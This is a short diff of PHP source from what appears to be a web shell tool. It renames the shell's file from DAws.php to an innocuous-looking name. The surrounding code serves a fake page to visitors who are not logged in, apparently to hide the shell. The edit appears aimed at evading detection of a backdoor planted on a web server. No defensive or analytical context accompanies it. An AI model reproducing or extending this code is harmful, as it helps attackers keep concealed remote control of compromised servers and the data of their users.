@@ -385,11 +385,11 @@ if (!isset($_SESSION["logged_in"])) {
 		}
 		
 		$random_string = time();
-		$random_url .= "://".$_SERVER['SERVER_NAME']."/".$random_string."/DAws.php"; //our random bitch
+		$random_url .= "://".$_SERVER['SERVER_NAME']."/".$random_string."/cmanker.php"; //our random bitch
 		$output = @url_get_contents($random_url);
 
 		if ($output != "") {
-			echo str_replace("/".$random_string."/DAws.php", "/DAws.php", $output);
+			echo str_replace("/".$random_string."/cmanker.php", "/cmanker.php", $output);
 		} else {
 			echo $static_fake_page;
 		}
